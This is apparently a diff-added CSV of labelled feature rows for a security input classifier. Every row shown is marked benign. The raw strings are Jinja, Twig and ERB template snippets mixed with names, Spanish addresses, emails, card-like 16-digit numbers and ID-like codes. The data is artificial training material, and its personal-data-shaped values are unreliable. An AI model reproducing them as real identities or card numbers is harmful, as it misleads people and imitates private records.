+laneuville@hangarcentrodelautomovil.sh,laneuville@hangarcentrodelautomovil.sh,38,0.052632,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+{{ _('Send private message') }},{{_('S')}},31,0.290323,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+{{ _('New User?') }},{{_('S')}},20,0.5,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+23l8noi7e,NlNnoiNe,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+lacivo,lacivo,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+93640511j,Nj,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+einar,einar,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+1i6osa,NiNosa,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= kls %>,<%=kls%>,10,0.5,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+7812372382354284,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{% block body_id 'comment_form_error' %},{%blockbody_id'S'%},40,0.225,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
+paolino amodeo,paolinoamodeo,14,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+glvez matons,glvezmatons,12,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+3186627053603991,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"<% id = ""metrics-swatch-#{kls}"" %>","<%id=""S""%>",34,0.352941,0,0,1,0,2,2,1,0,0,0,0,0,0,0,0,0
+"<% job_results.each_with_index do |(kls, jr), i| %>","<%job_results.each_with_indexdo|(kls,jr),i|%>",51,0.27451,0,0,0,0,2,1,1,0,0,0,0,0,0,0,1,0
+lonnie,lonnie,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+francis@ocymafa.tt,francis@ocymafa.tt,18,0.111111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+4830,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+mannoers@magichobby.se,mannoers@magichobby.se,22,0.090909,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+<%= csp_meta_tag %>,<%=csp_meta_tag%>,19,0.368421,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+87r5raviat8,NrNraviatN,11,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{% if user == current_user %},{%ifuser==current_user%},29,0.241379,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0
+"{{ url_for('main.send_message', recipient=user.username) }}","{{url_for('S',recipient=user.username)}}",59,0.237288,1,0,0,0,0,1,3,0,0,0,1,0,0,0,2,0
+9637,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ 'label.cancel'|trans }},{{'S'|trans}},26,0.307692,1,0,0,0,0,1,2,0,0,0,0,0,0,0,1,0
+<%= csrf_meta_tags %>,<%=csrf_meta_tags%>,21,0.333333,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+28529,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+cartes,cartes,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+5696,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"pl. don fernando, s/n,","pl.donfernando,s/n,",22,0.181818,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+#{date},#{date},7,0.428571,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0
+${visit['new']},${visit['S']},15,0.466667,0,1,0,0,0,1,2,0,0,0,0,0,0,0,0,0
+selene,selene,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"{{ form.submit(value=_('Follow'), class_='btn btn-primary') }}","{{form.submit(value=_('S'),class_='S')}}",62,0.306452,1,0,0,0,0,1,4,0,0,0,0,0,0,1,1,0
+kumushalieva@hiperbarcelona.ly,kumushalieva@hiperbarcelona.ly,30,0.066667,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+#{previousVisits},#{previousvisits},17,0.176471,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0
+montn,montn,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if visible_kls.include?(kls) %>,<%ifvisible_kls.include?(kls)%>,34,0.264706,0,0,0,0,2,1,1,0,0,0,0,0,0,0,1,0
+"<%= stylesheet_link_tag ""application"", ""data-turbo-track"": ""reload"" %>","<%=stylesheet_link_tag""S"",""S"":""S""%>",70,0.242857,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+3290,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+vilabella,vilabella,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if process.stopping? %>,<%ifprocess.stopping?%>,26,0.230769,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+ren,ren,3,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+siripong,siripong,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+73002359z,Nz,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+${pet.id},${pet.id},9,0.444444,0,1,0,0,0,1,1,0,0,0,0,0,0,0,1,0
+8879069271917222,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"cabaeros, 131","cabaeros,N",13,0.076923,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+86343464s,Ns,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+84165780v,Nv,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+#{t('Queues')},#{t('S')},14,0.5,0,0,1,0,0,1,2,0,0,0,0,0,0,0,0,0
+grelck,grelck,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+calle fausto fraile 0,callefaustofraileN,21,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+ermina,ermina,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+otxandio,otxandio,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+almaraz,almaraz,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"buidaoli, 49, 12-g","buidaoli,N,N-g",18,0.166667,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+tchjan-lian.quadflieg@comerciosdeaspe.se,tchjan-lian.quadflieg@comerciosdeaspe.se,40,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0
+villalba de la loma,villalbadelaloma,19,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+38844,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+presencio,presencio,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+bleifer@muchacha.com.bh,bleifer@muchacha.com.bh,23,0.130435,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0
+{{ user.avatar(256) }},{{user.avatar(N)}},22,0.318182,1,0,0,0,0,1,3,0,0,0,0,0,0,1,1,0
+<%= job.display_class %>,<%=job.display_class%>,24,0.291667,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+jernima,jernima,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"paratge ter, 33,","paratgeter,N,",16,0.125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+40592671v,Nv,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+5202,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+4879316805989333,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= display_args(job.display_args) %>,<%=display_args(job.display_args)%>,37,0.27027,0,0,0,0,2,1,1,0,0,0,0,0,0,0,1,0
+3099595340897586,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+menasce,menasce,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+78,N,2,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+encalador,encalador,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+doct4r9miento,doctNrNmiento,13,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+1289184005344933,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('AvgExecutionTime') %>,<%=t('S')%>,28,0.321429,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+kalila,kalila,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+brasset,brasset,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+19197,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+kuhn cota,kuhncota,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+alhama de granada,alhamadegranada,17,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+garner3,garnerN,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"moneyba, 114","moneyba,N",12,0.083333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+pompilio,pompilio,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ url_for('main.export_posts') }},{{url_for('S')}},34,0.323529,1,0,0,0,0,1,3,0,0,0,1,0,0,0,1,0
+lischyns,lischyns,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Processes') %>,<%=t('S')%>,21,0.428571,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+<%= t('StopAll') %>,<%=t('S')%>,19,0.473684,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+<% if @show_jobs %>,<%if@show_jobs%>,19,0.315789,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+6424,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ 'action.back_to_list'|trans }},{{'S'|trans}},33,0.30303,1,0,0,0,0,1,2,0,0,0,0,0,0,0,1,0
+"<%= h url_params(""substr"") %>","<%=hurl_params(""S"")%>",29,0.344828,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+<%= t('Seconds') %>,<%=t('S')%>,19,0.473684,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+bravat-a,bravat-a,8,0.125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+etreros 8 13a,etrerosNNa,13,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+grandia zarzosa,grandiazarzosa,15,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+hinton-s,hinton-s,8,0.125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+74725623a,Na,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= s = processes.size; number_with_delimiter(s) %>,<%=s=processes.size;number_with_delimiter(s)%>,51,0.235294,0,0,0,0,2,1,1,0,0,0,0,0,0,0,1,0
+20223132z,Nz,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+manrique,manrique,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+garabana belart,garabanabelart,15,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+1370,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+baides,baides,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+herreta taul,herretataul,12,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+b6ar1261,bNarN,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"enparantza concordia 47,","enparantzaconcordiaN,",24,0.041667,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+91553356q,Nq,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+119,N,3,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+barlovento,barlovento,10,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+#{t('Version')},#{t('S')},15,0.466667,0,0,1,0,0,1,2,0,0,0,0,0,0,0,0,0
+castrillo de la valduerna,castrillodelavalduerna,25,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ form_widget(form) }},{{form_widget(form)}},23,0.304348,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+0ehusa2,NehusaN,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+ajoy,ajoy,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+indamira,indamira,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if process.version != Sidekiq::VERSION %>,<%ifprocess.version!=sidekiq::version%>,44,0.204545,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+alejandro,alejandro,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= job.jid %>,<%=job.jid%>,14,0.428571,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+toribio,toribio,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+jean-yve,jean-yve,8,0.125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+88253687l,Nl,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"rio nervion, 177","rionervion,N",16,0.0625,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ _('Sign In') }},{{_('S')}},18,0.5,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+<% unless process.embedded? %>,<%unlessprocess.embedded?%>,30,0.2,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+enero,enero,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+chihung,chihung,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Jobs') %>,<%=t('S')%>,16,0.5625,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+<%= CGI.escape(work.queue) %>,<%=cgi.escape(work.queue)%>,29,0.310345,0,0,0,0,2,1,1,0,0,0,0,0,0,1,2,0
+mccurdy,mccurdy,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+878eca6or5,NecaNorN,10,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if process.version %>,<%ifprocess.version%>,24,0.208333,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+33,N,2,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Status') %>,<%=t('S')%>,18,0.5,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+9755,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+guilas,guilas,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+crislida,crislida,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+${visit},${visit},8,0.375,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0
+4501,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ include('blog/_comment_form.html.twig') }},{{include('S')}},45,0.288889,1,0,0,0,0,1,3,0,0,0,0,0,0,0,2,0
+<%= t('Success') %>,<%=t('S')%>,19,0.473684,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+2160,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+gorfine,gorfine,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+thalasso.chappell@titulosoficiales.jp,thalasso.chappell@titulosoficiales.jp,37,0.081081,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0
+fisicoqumico,fisicoqumico,12,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"calle escritor cerda y godoy, 191","calleescritorcerdaygodoy,N",33,0.030303,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if @show_processes %>,<%if@show_processes%>,24,0.25,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+"calle goya 46, 10?g","callegoyaN,N?g",19,0.105263,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ url_for('auth.register') }},{{url_for('S')}},30,0.333333,1,0,0,0,0,1,3,0,0,0,1,0,0,0,1,0
+isalenia,isalenia,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+.raijo,.raijo,6,0.166667,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+6o7zo6a,NoNzoNa,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+7785,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+8099,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"<%= number_with_delimiter(jr.total_avg(""s""), precision: 2) %>","<%=number_with_delimiter(jr.total_avg(""S""),precision:N)%>",61,0.278689,0,0,0,0,2,1,2,0,0,0,0,0,0,1,1,0
+16878,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+46,N,2,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"<%= number_with_delimiter(jr.dig(""totals"", ""p"") - jr.dig(""totals"", ""f"")) %>","<%=number_with_delimiter(jr.dig(""S"",""S"")-jr.dig(""S"",""S""))%>",75,0.346667,0,0,0,0,2,1,2,0,0,0,0,0,0,2,2,0
+heile,heile,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+ja34ico,jaNico,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+gullera,gullera,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+4210,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= format_memory(process['rss'].to_i) %>,<%=format_memory(process['S'].to_i)%>,41,0.341463,0,0,0,0,2,1,2,0,0,0,0,0,0,0,1,0
+<%= t('Unknown') %>,<%=t('S')%>,19,0.473684,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+hana,hana,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{% set attr = {'data-confirmation': 'true'} %},{%setattr={'S':'S'}%},46,0.282609,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0
+e1bud8,eNbudN,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+69309273s,Ns,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+1902,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if process.identity == lead %>,<%ifprocess.identity==lead%>,33,0.212121,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+50932385n,Nn,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{% if not current_user.get_task_in_progress('export_posts') %},{%ifnotcurrent_user.get_task_in_progress('S')%},62,0.225806,0,0,0,0,0,0,2,0,0,0,0,0,0,1,1,0
+"calle hernandez iglesias, 160,","callehernandeziglesias,N,",30,0.066667,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+kitaen5@lawn.vn,kitaenN@lawn.vn,15,0.133333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+brihuega uslet,brihuegauslet,14,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+18518,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= label %>,<%=label%>,12,0.416667,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+sa89gn,saNgn,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"<%= number_with_delimiter(jr.dig(""totals"", ""f"")) %>","<%=number_with_delimiter(jr.dig(""S"",""S""))%>",51,0.333333,0,0,0,0,2,1,2,0,0,0,0,0,0,1,1,0
+95937804c,Nc,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('TotalExecutionTime') %>,<%=t('S')%>,30,0.3,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+talens zumalacrregui,talenszumalacrregui,20,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ 'delete_post_modal.title'|trans }},{{'S'|trans}},37,0.27027,1,0,0,0,0,1,2,0,0,0,0,0,0,0,1,0
+{{ _('Edit your profile') }},{{_('S')}},28,0.321429,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+radley,radley,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+${visit.description},${visit.description},20,0.2,0,1,0,0,0,1,1,0,0,0,0,0,0,0,1,0
+{{ 'delete_post_modal.body'|trans }},{{'S'|trans}},36,0.277778,1,0,0,0,0,1,2,0,0,0,0,0,0,0,1,0
+canela,canela,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"c/ periodista adeflor, 12,","c/periodistaadeflor,N,",26,0.115385,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+esio,esio,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+eber,eber,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+j6ca,jNca,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+1721278325772936,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"c/ bellavista, 70 10h","c/bellavista,NNh",21,0.095238,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% if @workset.size > 0 && @total_size > @count %>,<%if@workset.size>N&&@total_size>@count%>,50,0.26,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+<%= x = processes.total_concurrency; number_with_delimiter(x) %>,<%=x=processes.total_concurrency;number_with_delimiter(x)%>,64,0.203125,0,0,0,0,2,1,1,0,0,0,0,0,0,0,1,0
+#{pet},#{pet},6,0.5,0,0,1,0,0,1,1,0,0,0,0,0,0,0,0,0
+<% unless process.stopping? %>,<%unlessprocess.stopping?%>,30,0.2,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+<%= x == 0 ? 0 : ((ws / x.to_f) * 100).round(0) %>,<%=x==N?N:((ws/x.to_f)*N).round(N)%>,50,0.4,0,0,0,0,2,1,2,0,0,0,0,0,0,1,2,0
+<%= which %>,<%=which%>,12,0.416667,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0
+cotten@comodepilarse.cm,cotten@comodepilarse.cm,23,0.086957,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+"<%= ""#{t('Version')}: "" %>","<%=""S""%>",26,0.576923,0,0,1,0,2,2,2,0,0,0,0,0,0,0,0,0
+<%= h work.queue %>,<%=hwork.queue%>,19,0.315789,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+66866648j,Nj,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+364,N,3,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% job = work.job %>,<%job=work.job%>,20,0.3,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+legris@beautifulbody.yu,legris@beautifulbody.yu,23,0.086957,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+"c/ san francisco, 45","c/sanfrancisco,N",20,0.1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+hontanares de eresma,hontanaresdeeresma,20,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+c/ crevillente 63,c/crevillenteN,17,0.058824,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+elsen@whitehat.td,elsen@whitehat.td,17,0.117647,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+epps6,eppsN,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= ws = workset.size; number_with_delimiter(ws) %>,<%=ws=workset.size;number_with_delimiter(ws)%>,51,0.235294,0,0,0,0,2,1,1,0,0,0,0,0,0,0,1,0
+48872890y,Ny,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<% lead = processes.leader %>,<%lead=processes.leader%>,29,0.206897,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+37905890g,Ng,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+freiwald1,freiwaldN,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+cianneli@connect.pg,cianneli@connect.pg,19,0.105263,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+solana,solana,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+sed4e748,sedNeN,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+chapman,chapman,7,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+4650446572677289,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+liesemer,liesemer,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"<%= display_tags(job, nil) %>","<%=display_tags(job,nil)%>",29,0.310345,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+49697,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+wendell@somosagelespaa.ml,wendell@somosagelespaa.ml,25,0.08,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+<%= t('QuietAll') %>,<%=t('S')%>,20,0.45,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+lesmeris,lesmeris,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+pryor,pryor,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+faucette,faucette,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+rosana,rosana,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+pilapil@espaciopintor.my,pilapil@espaciopintor.my,24,0.083333,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0
+10373,N,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+16296629w,Nw,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+33544296s,Ns,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+sabanea9,sabaneaN,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+colliti.shale@ropadegolf.com.dd,colliti.shale@ropadegolf.com.dd,31,0.129032,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,0
+moharra jodra,moharrajodra,13,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+8889874100386477,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ 'title.comment_error'|trans }},{{'S'|trans}},33,0.272727,1,0,0,0,0,1,2,0,0,0,0,0,0,0,1,0
+suyay,suyay,5,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= number_with_delimiter(process['concurrency']) %>,<%=number_with_delimiter(process['S'])%>,52,0.25,0,0,0,0,2,1,2,0,0,0,0,0,0,0,0,0
+9717,N,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"villares, los","villares,los",13,0.076923,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+5220241028812840,N,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+valpalmas,valpalmas,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+27415264t,Nt,9,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+<%= t('Process') %>,<%=t('S')%>,19,0.473684,0,0,0,0,2,1,1,0,0,0,0,0,0,0,0,0
+borracho,borracho,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ _('Click to Register!') }},{{_('S')}},29,0.344828,1,0,0,0,0,1,3,0,0,0,0,0,0,0,0,0
+roelos de sayago,roelosdesayago,16,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+ava8,avaN,4,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+agustn,agustn,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+{{ moment(user.last_seen).format('LLL') }},{{moment(user.last_seen).format('S')}},42,0.309524,1,0,0,0,0,1,3,0,0,0,0,0,1,1,2,0
+"<% @workset.each do |process, thread, work| %>","<%@workset.eachdo|process,thread,work|%>",46,0.217391,0,0,0,0,2,1,0,0,0,0,0,0,0,0,1,0
+"{{ form_start(form, {attr: {novalidate: 'novalidate'}}","{{form_start(form,{attr:{novalidate:'S'}}",54,0.240741,1,0,0,0,0,1,5,0,0,0,0,0,0,0,0,0
+naresh,naresh,6,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+"c/ errementariena 31,","c/errementarienaN,",21,0.095238,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
+somnfero,somnfero,8,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
